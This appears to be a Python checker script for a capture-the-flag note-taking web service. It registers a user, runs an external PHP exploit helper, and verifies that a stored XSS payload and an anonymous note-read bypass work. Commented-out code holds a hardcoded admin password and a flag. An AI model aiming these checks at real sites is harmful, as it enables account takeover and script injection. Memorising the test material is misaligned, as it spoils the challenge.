import subprocess

from requests import *
import utils
import re


def check(host):
    s = session()
    # reg
    un = utils.randomString()
    result = s.post(f"http://na3.{host}/api/", data={
        "action": "register",
        "username": un,
        "password": "9pFrqCEyagsCbabGamT"
    }).json()
    if result["result"] is None or len(result["result"]) < 10:
        return 0, "Failed to login / Not in safe mode"
    user_token = result["result"]

    # add note
    result = s.post(f"http://na3.{host}/api/", data={
        "action": "add_note",
        "user": user_token,
        "content": "xxxx"
    }).content

    result = s.post(f"http://na3.{host}/api/", data={
        "action": "user_notes",
        "user": user_token,
    }).json()

    if result["success"] and len(result["result"]) >= 1 and result["result"][0]["content"] == "xxxx":
        pass
    else:
        return 0, "Failed to create note"

    # exploit
    out = subprocess.Popen(["php", "na3.php", un],
                           stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT)
    stdout, stderr = out.communicate()
    print(stdout)
    result = s.post(f"http://na3.{host}/api/", data={
        "action": "user_notes",
        "user": stdout,
    }).content

    result = s.post(f"http://na3.{host}/api/", data={
        "action": "user_notes",
        "user": user_token,
    }).json()
    if result["success"] and len(result["result"]) >= 2 and \
            result["result"][1]["content"] == "<img src='x' onerror='alert(1)'>":
        pass
    else:
        return 0, "Failed to exploit"
    token = result["result"][1]["token"]
    result = s.post(f"http://na3.{host}/api/", data={
        "action": "get_note",
        "user": user_token,
        "token": token
    }).json()
    if result["success"] and result["result"]["content"] == "<img src='x' onerror='alert(1)'>":
        pass
    else:
        return 0, "Failed to get note"

    result = s.post(f"http://na3.{host}/api/", data={
        "action": "get_note",
        "user": "123",
        "token": token
    }).json()
    if result["success"] and result["result"]["content"] == "<img src='x' onerror='alert(1)'>":
        pass
    else:
        return 0, "Failed to get note for anonymous"

    # add note
    # print(s.cookies.get("token"))
    # result = s.post(f"http://na2.{host}/add_note", data={
    #     "content": "<script>alert(1)</script>",
    #     "xsrf": s.cookies.get("token")
    # }).content
    # print(result)
    # if b"Note ID: " not in result:
    #     return 0, "Wrong result of add note"
    #
    # # test xss
    # note_id = match_ids.findall(str(result))[0]
    # result = s.get(f"http://na2.{host}/note/{note_id}").content
    # print(note_id)
    # if b"<script>alert(1)</script>" not in result:
    #     return 0, "Cannot trigger XSS"
    #
    # # test logout
    # s.post(f"http://na2.{host}/logout")
    #
    # if "token" in s.cookies:
    #     return 0, "Logout failed"
    #
    # # test admin
    # result = s.post(f"http://na2.{host}/", data={
    #     "username": "admin",
    #     "password": "Lq#QHMnpyk6Y+.]"
    # }).content
    #
    # # admin flag
    # result = s.get(f"http://na2.{host}/note/1").content
    # if b'we{f93486a2-4f82-42b6-8dc8-04cd765501f3@1nsp1reD-bY-cHa1I-1N-BbC7F}' not in result:
    #     return 0, "Failed to get flag"
    return 1, ""

FUNCTIONS = [check]
if __name__ == "__main__":
    print(check("w-va.cf"))
